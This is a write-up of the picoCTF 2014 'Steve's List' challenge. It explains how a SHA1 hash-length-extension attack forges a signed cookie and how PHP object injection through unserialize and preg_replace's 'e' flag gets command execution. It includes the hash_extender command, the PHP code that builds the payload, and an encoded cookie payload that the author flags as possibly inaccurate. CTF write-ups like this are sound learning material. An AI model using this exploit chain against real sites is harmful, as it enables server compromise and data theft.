---
slug: picoctf-2014-part3
title: "picoCTF 2014 part 3: Steve's List"
authors: csressel
#tags: []
---

Steve’s List
==========

Summary
--------------
Hash extension allows us to enter whatever cookies we choose, without knowledge of the secret, and still pass the website’s checks. Since the cookie is unserialized, we can inject arbitrary php objects into the server. By injecting a Post object, we know it’s destroy method will be called. This method has been redefined to output the Post’s fields in HTML comments after parsing them with the class Filter. The Filter operates by running the given text through preg_replace calls with stored params for match and substitution. As we have injected the object, we have complete control over these stored params, and can thus call the preg_replace with the ‘e’ flag, allowing us to do arbitrary command execution. By catting the necessary file at `/home/daedalus/flag.txt`, and substituting all of the Post’s text with the file’s contents, we can print the file’s contents in an HTML comment, and thus get the flag.

<!--truncate-->

The Hash Extension
-----------------------------
Examination of the hacked website shows the only possible input is through the cookies.
However, any attempts to manipulate the cooke result in us being locked out of the website.

Examination of the website source makes it quickly apparent why:
```PHP
$custom_settings = urldecode($_COOKIE['custom_settings']);
$hash = sha1(AUTH_SECRET . $custom_settings);
if ($hash !== $_COOKIE['custom_settings_hash']) {
  die("Why would you hack Section Chief Steve's site? :(");
}
```
The cookie `custom_settings` will later be deserialized, and will be the site of our object inject. However, `custom_settings_hash` will need to change in a similar manner.

To not fail the validation, `custom_settings_hash` needs to be of the form `sha1(AUTH_SECRET . urldecode($_COOKIE['custom_settings']))` where `AUTH_SECRET` is an unknown, eight letter secret.
As we do not have access to `AUTH_SECRET`, it would appear that we are unable to change the `custom_settings` cookie.

However, using a hash extension attack, we can change the value of `custom_settings_hash` to correspond to our new value of `custom_settings` without knowledge of the `AUTH_SECRET`.

The tool to be used is called <a href='https://github.com/iagox86/hash_extender'>hash extender</a>. By downloading and compiling the program, we can generate the new value of `custom_settings_hash` with the following command:

```Shell
$ ./hash_extender --data d --secret 8 --append a --signature s --format sha1 --table
```
where `d` is the previous `custom_settings`, `a` is the addition to the `custom_settings` (or the object injection), and s is the previous value of `custom_settings_hash`.

With this value, we can now manipulate `custom_settings` without tripping Steve’s rudimentary IPS.

The Object Injection
-----------------------------
There are several important items to notice while reading the source of the website.

1. Whatever is in the `custom_settings` cookie will be unserialized. Specifically, the contents will be split on newlines, and each section will be individually unserialized.
2. In the `classes.php` file, the Post’s `__destruct()` method is redefined. It now is intended to output the Post’s fields in comments, as “debugging stuff.”
3. The Filter class used by the Post’s `__destruct()` method uses the `preg_replace()` method with class fields as arguments.

These three facts, taken together, allow us to do arbitrary command execution with viewing of output by injecting objects into the `custom_settings` cookie.

The necessary object to cat the flag from `/home/daedalus/flag.txt` will look something like this in PHP:

```PHP
$filter_set = [
		new Filter('/.*/e', 'system("cat /home/daedalus/flag.txt")')
	];
$obj = serialize(true) . "\n" . serialize(new Post(
	"the flag is",
	"fail",
	$filter_set));
```
The Filter uses the “e” flag on the `preg_replace()` call. This will run the replacement argument as PHP code and replace the matching text with the output.

By having out only filter match everything, and run the command `$ cat /home/daedalus/flag.txt`, we will replace the body of the Post we inject with the flag.

Outputting this serialized object to a file, and inputting that file to the hash_extender command discussed above, we can generate the new value of `custom_settings_hash`. It is important to note, using a file is the best way to go about this part of the problem; before the object is urlencoded, it will have nonprinting characters which you will not be able to copy and paste.

Finally, by replacing `custom_settings` with a urlencoding of the serialized object, and `custom_settings_hash` with the new signature, we will see the flag in the comments of the site:

D43d4lu5_w45_h3r3_w1th_s3rialization_chief_steve

----

Note: the payload for `custom_settings` will look something like:
```
b%253A1%253B%250AO%253A4%253A%2522Post%2522%253A3%253A%257Bs%253A8%253A%2522%2500%252A%2500title%2522%253Bs%253A11%253A%2522the%2Bflag%2Bis%2522%253Bs%253A7%253A%2522%2500%252A%2500text%2522%253Bs%253A4%253A%2522fail%2522%253Bs%253A10%253A%2522%2500%252A%2500filters%2522%253Ba%253A1%253A%257Bi%253A0%253BO%253A6%253A%2522Filter%2522%253A2%253A%257Bs%253A10%253A%2522%2500%252A%2500pattern%2522%253Bs%253A5%253A%2522%252F.%252A%252Fe%2522%253Bs%253A7%253A%2522%2500%252A%2500repl%2522%253Bs%253A37%253A%2522system%2528%2522cat%2B%252Fhome%252Fdaedalus%252Fflag.txt%2522%2529%2522%253B%257D%257D%257D
```
However, I do not believe this is perfectly accurate as I recall making changes out of file that were never duplicated in my backup of the payload. Because of this, I have not included the payload or its signature in this writeup.
